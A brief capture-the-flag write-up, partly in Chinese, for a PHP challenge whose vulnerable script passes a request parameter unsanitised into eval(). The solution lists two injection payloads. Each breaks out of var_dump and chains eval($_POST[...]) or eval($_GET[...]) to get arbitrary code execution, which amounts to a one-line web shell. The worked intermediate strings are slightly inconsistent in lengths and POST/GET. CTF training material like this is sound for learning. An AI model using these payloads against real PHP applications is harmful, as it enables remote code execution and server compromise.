# Challenge 
```php 
<?php 
error_reporting(0);
show_source(__FILE__);

$a = @$_REQUEST['hello'];
eval("var_dump($a);"); 
```

# Solution
## payload1
```
?hello=);eval($_POST['A']);%2f%2f

或

?hello=);eval(phpinfo());//
```
var_dump($a);后的结果为
```
string(22) ");eval($_POST['A']);//"
```

即
```
eval("string(21) ");eval($_GET['A']);//"");
```

## payload2
```
?hello=);eval($_GET[c]&c=phpinfo();
```
var_dump()后的结果是
```
string(15) ");eval($_GET[c]"
```

即
```
eval("string(17) ");eval($_GET[c]" string(0) "" ");
```
# Refference
+ [XNUCA 赛前指导 default](http://218.76.35.74:20131/index2.php)